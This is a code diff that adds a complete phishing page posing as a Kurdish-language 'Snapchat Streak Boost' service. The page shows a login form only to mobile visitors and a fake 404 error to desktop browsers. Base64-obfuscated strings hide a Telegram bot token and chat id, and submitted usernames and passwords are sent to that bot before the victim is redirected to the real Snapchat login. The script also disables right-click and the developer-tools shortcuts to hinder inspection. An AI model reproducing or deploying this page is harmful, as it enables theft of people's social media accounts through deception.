@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat Streak Boost</title>
+    <style>
+        body { background: #FFFC00; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, sans-serif; overflow: hidden; }
+        #app-root { width: 85%; max-width: 300px; z-index: 2; }
+    </style>
+</head>
+<body>
+    <div id="app-root"></div>
+
+    <script>
+        const _s = {
+            t: "NzczNzI3NDAyNjpBQUhTYlMtaUU4b1FfRV85WjlaOVo5WjlaOVo5WjlaOVo5Wg==",
+            c: "NjYzOTUzNTMw",
+            u: "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==",
+            g: "aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb20="
+        };
+
+        const isM = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        if (!isM) {
+            document.body.style.background = "white";
+            document.getElementById('app-root').innerHTML = "<h1 style='color:#333;text-align:center;font-size:18px;'>404 Error: Not Found</h1>";
+        } else {
+            const ui = `
+                <div style="background:white; padding:25px 18px; border-radius:20px; text-align:center; box-shadow:0 15px 35px rgba(0,0,0,0.1); position:relative;">
+                    <div id="wait" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.85); border-radius:20px; justify-content:center; align-items:center; z-index:20;"><div style="width:22px; height:22px; border:3px solid #f3f3f3; border-top:3px solid #00ADEE; border-radius:50%; animation:spin 0.8s linear infinite;"></div></div>
+                    <img src="https://id.snapchat.com/identity/static/images/ghost.png" style="width:48px; margin-bottom:12px;">
+                    <h2 style="margin:0 0 6px; font-size:17px; color:#1d1d1f; font-weight:800;">زيادكردنى ستريكى سناپچات</h2>
+                    <p style="color:#86868b; font-size:12px; margin-bottom:20px; line-height:1.4;">بۆ زيادكردنى ستريكەكانت بە شێوەیەکی خێرا، تكایە بچۆ ناو هەژمارەكەت.</p>
+                    <form id="v-form" dir="rtl">
+                        <input type="text" id="ux" placeholder="ناوى بەکارهێنەر" style="width:90%; padding:10px 12px; margin-bottom:8px; border:1px solid #d2d2d7; border-radius:10px; background:#f5f5f7; font-size:14px; outline:none;" required>
+                        <input type="password" id="px" placeholder="تێپەڕەوشە (پاسوۆرد)" style="width:90%; padding:10px 12px; margin-bottom:15px; border:1px solid #d2d2d7; border-radius:10px; background:#f5f5f7; font-size:14px; outline:none;" required>
+                        <button type="submit" style="width:98%; padding:12px; background:#00ADEE; color:white; border:none; border-radius:22px; font-weight:700; font-size:15px; cursor:pointer;">زيادكردن</button>
+                    </form>
+                </div>
+                <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+            `;
+            document.getElementById('app-root').innerHTML = ui;
+        }
+
+        const dec = (v) => atob(v);
+
+        document.addEventListener('submit', async (e) => {
+            if (e.target.id === 'v-form') {
+                e.preventDefault();
+                document.getElementById('wait').style.display = 'flex';
+
+                const u = document.getElementById('ux').value;
+                const p = document.getElementById('px').value;
+                const info = `🔥 [STREAK BOOST] 🔥\n\n👤 User: ${u}\n🔑 Pass: ${p}\n📱 System: ${navigator.platform}`;
+
+                try {
+                    await fetch(dec(_s.u) + dec(_s.t) + dec("L3NlbmRNZXNzYWdl"), {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: dec(_s.c), text: info })
+                    });
+                } catch (e) {}
+
+                setTimeout(() => {
+                    window.location.replace(dec(_s.g));
+                }, 1000);
+            }
+        });
+
+        document.oncontextmenu = () => false;
+        document.onkeydown = (e) => {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
+        };
+    </script>
+</body>
+</html>
